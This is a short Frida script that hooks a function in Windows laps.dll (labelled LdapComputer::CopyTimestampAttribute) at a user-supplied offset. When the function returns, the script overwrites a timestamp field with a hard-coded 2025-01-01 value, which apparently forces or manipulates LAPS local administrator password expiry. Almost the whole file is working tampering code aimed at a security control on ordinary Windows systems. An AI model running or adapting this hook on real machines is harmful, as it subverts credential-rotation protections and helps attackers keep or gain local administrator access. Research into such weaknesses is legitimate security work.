const offset = OFFSETVALUE; // Update me - offset to the target function

const moduleName = 'laps.dll';
const targetModule = Process.enumerateModules().find(mod => mod.name.toLowerCase().includes(moduleName.toLowerCase()));

if (targetModule !== undefined) {
    const baseAddr = targetModule.base;
    const targetFuncAddr = baseAddr.add(offset);
    console.log(`[+] Base address of ${moduleName}: ${baseAddr}`);   
    console.log(`[+] Hooking function at ${targetFuncAddr} (offset 0x${offset.toString(16)})`);

    Interceptor.attach(targetFuncAddr, {
        onEnter: function (args) {
            console.log('[RESET] LdapComputer::CopyTimestampAttribute');
                    this.arg0 = args[0];
        },
        onLeave: function (retval) {
            console.log('Leaving LdapComputer::CopyTimestampAttribute - Forcing update');
                    this.arg0.add(0x18).writeU64(133801632000000000); // 2025-01-01
        }
    });

} else {
    console.error(`[-] Could not find base address for ${moduleName}`);
}
